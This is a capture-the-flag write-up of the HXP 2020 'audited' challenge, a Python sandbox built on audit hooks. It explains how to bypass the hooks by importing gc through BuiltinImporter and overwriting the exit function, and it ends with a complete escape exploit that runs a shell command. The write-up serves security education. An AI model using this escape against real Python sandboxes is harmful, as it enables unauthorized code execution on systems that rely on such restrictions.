[HXP 2020 CTF](https://2020.ctf.link/) write ups
================================================

## Pwn

### audited

This was a fun little Python exercise, ultimately escaping a sandboxing attempt.

This was the code of the challenge:
```python
#!/usr/bin/python3 -u

import sys
from os import _exit as __exit

def audit(name, args):
    if not audit.did_exec and name == 'exec':
        audit.did_exec = True
    else:
        __exit(1)
audit.did_exec = False

sys.stdout.write('> ')
try:
    code = compile(sys.stdin.read(), '<user input>', 'exec')
except:
    __exit(1)
sys.stdin.close()

for module in set(sys.modules.keys()):
    if module in sys.modules:
        del sys.modules[module]

sys.addaudithook(audit)

namespace = {}
try:
    exec(code, namespace, namespace)
except:
    __exit(1)
__exit(0)
```

The program is quite simple:
It will first read our input from `stdin` and compile it for execution with `exec`.
It then sets up an `PySys_AddAuditHook()` using `sys.addaudithook()`

The hook itself just checks whether the triggering function is called `exec` and prevents any further invocations after the first `exec` by calling `__exit()`.
Note that the `exec` which executes our input is already registered.
This essentially means that we must not trigger an audit event or else the process will be terminated.
A list of invocations which cause an event can be viewed in the [official docs](https://docs.python.org/3/library/audit_events.html#audit-events).


To make things more interesting you can apply the following patch:
```
diff --git a/audited.py b/audited2.py
index 8a6425c..6f1ee31 100755
--- a/audited.py
+++ b/audited2.py
@@ -23,7 +23,7 @@ for module in set(sys.modules.keys()):

 sys.addaudithook(audit)

-namespace = {}
+namespace = {'__builtins__': {}}
 try:
     exec(code, namespace, namespace)
 except:
```

Because otherwise the `__builtins__` would be passed from the parent process as stated in the docs:
> If the globals dictionary does not contain a value for the key `__builtins__`, a reference to the dictionary of the built-in module builtins is inserted under that key. That way you can control what builtins are available to the executed code by inserting your own `__builtins__` dictionary into globals before passing it to `exec()`.

That would obviously make things way too easy :S


If you inspect the list of events you will notice that we are pretty much screwed.
We cannot really do anything.
We cannot even access object attributes.

But first things first.
Let's set up our list of builtins we will work with.
There is a common trick for that:
```python
x = 1
x.__class__.__mro__[1].__subclasses__()
```

Go check out which classes are available to us.

There is one which could be used to read files: `<class '_frozen_importlib_external.FileLoader'>`
If the flag would be at a known location we could simply dump the file using this guy.

But thanks **hxp**, it is not..

Stepping back, the only possible exploitation path is to prevent the process from exiting if we trigger an audit event.
Luckily we are not *really* inside a sandbox, so all the objects of the parent process are happily available to us.
One such option is the `gc` module (garbage collection).
It provides a pretty handy method `get_objects()` which basically returns all the currently allocated objects.

But how do we actually import it?
Using a `<class '_frozen_importlib.BuiltinImporter'>` of cause!
Luckily this one also does not trigger an audit event. How convenient is that?

With all the objects playing easy to get we can simply overwrite the `__exit` function and do whatever we want :)

My final exploit:
```python
x = 1
y = x.__class__.__mro__[1].__subclasses__()[84]()
gc = y.load_module('gc')

for obj in gc.get_objects():
    try:
        obj.__exit = lambda _: None
    except:
        pass

os = y.load_module('builtins').__import__('os')
os.system('cat /flag*')
```
